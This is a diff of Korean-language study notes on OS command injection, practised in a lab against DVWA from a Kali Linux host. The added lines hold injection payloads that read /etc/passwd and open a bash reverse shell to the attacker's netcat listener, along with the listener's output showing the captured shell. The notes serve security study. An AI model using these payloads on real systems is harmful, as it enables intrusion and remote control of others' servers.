@@ -140,13 +140,14 @@ OS command injection
 || 앞 명령어 실패 시 뒤 명령어를 실행
  
 
-공격 실행 1.
+
+*공격 실행 1.
  - (ip ); /cat/etc/passwd
 
 ![](../Images/dfadsafasdfasdgah%201.png)
 
 
-공격 실행 2.
+*공격 실행 2.
 
 kali linux 환경
 ```bash
@@ -157,7 +158,35 @@ nc -lvnp 4444 //Listening 4444 port open
 192.168.63.133(kali linux ip)
 ```
 
-DVWA command injection prompt
+DVWA command injection prompt 입력
+```bash
+low- 127.0.0.1; bash -i >&/dev/tcp/192.168.63.133/4444 0>&1
+medium - 127.0.0.1&;&id bash -i >&/dev/tcp/192.168.63.133/4444 0>&1
+
 ```
-127.0.0.1; bash -i >&/dev/tcp/192.168.63.133/444 0 >&1
+
+kali linux
+```bash
+-- kali linux 변환
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 4444                            
+listening on [any] 4444 ...
+connect to [192.168.63.133] from (UNKNOWN) [192.168.63.134] 51206
+bash: cannot set terminal process group (983): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1$ ls          
+ls
+help
+index.php
+source
 ```
+- kali에서 web shell을 탈취한 것을 볼 수 있다.
+
+
+---
+
+
+### 자동화 공격
+- 무차별 대입 공격
+- 게시판에 글을 도배
+- 메일, sms 등 을 수백 건
